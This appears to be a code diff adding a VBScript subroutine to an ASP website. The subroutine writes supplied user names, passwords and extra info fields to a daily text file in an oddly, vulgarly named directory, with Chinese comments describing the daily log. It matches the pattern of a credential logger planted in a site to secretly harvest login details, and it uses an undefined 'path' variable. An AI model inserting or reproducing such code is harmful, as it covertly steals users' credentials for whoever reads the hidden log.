@@ -1,0 +1,20 @@
+Sub CreateFile(name,pass,xinxi)
+Dim fso, tf ,cf
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set tf = fso.openTextFile(server.mappath("caonimade/"&path&".txt"),8,True,True)
+'写在caonima的目录下，txt文件是日期命名的。一天生成一个txt文件。
+'tf.WriteLine("Testing 1, 2, 3.")
+'向文件写三个新行字符。
+'tf.WriteBlankLines(3)
+'写一行。
+xinxi = split(xinxi,"|")
+For Each Strs In xinxi
+tf.Write "info:"&Strs&"<br>"
+Next
+tf.Write "name:"&name&"<br>"
+tf.Write "pass:"&pass&"<br>"
+tf.write "----------------<Br>"
+tf.Close
+set fso = nothing
+End Sub
+%>
